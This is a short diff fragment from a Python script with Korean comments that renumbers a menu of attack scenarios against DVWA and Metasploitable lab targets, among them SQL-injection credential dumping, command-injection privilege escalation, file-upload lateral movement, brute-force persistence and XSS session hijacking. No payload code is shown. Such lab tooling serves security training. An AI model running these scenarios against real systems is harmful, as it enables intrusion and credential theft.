-        except ValueError:
-            print("잘못된 입력입니다.")
-            sys.exit(1)
-        run_metasploitable_scenario(choice)
         return
 
     # 시나리오 매핑
@@ -1558,11 +1075,11 @@ def main():
         4: scenario_4_file_upload,
         5: scenario_5_reflected_xss,
         # 파트 2: 통합 시나리오 — DVWA 침투 → 침투 후 공격 (세션 설정 필요)
-        11: scenario_11_sqli_credential_dump,
-        12: scenario_12_cmd_injection_privesc,
-        13: scenario_13_file_upload_lateral_movement,
-        14: scenario_14_bruteforce_persistence,
-        15: scenario_15_xss_session_hijack,
+        6: scenario_6_sqli_credential_dump,
+        7: scenario_7_cmd_injection_privesc,
+        8: scenario_8_file_upload_lateral_movement,
+        9: scenario_9_bruteforce_persistence,
+        10: scenario_10_xss_session_hijack,
     }
 
     setup_dvwa_session()
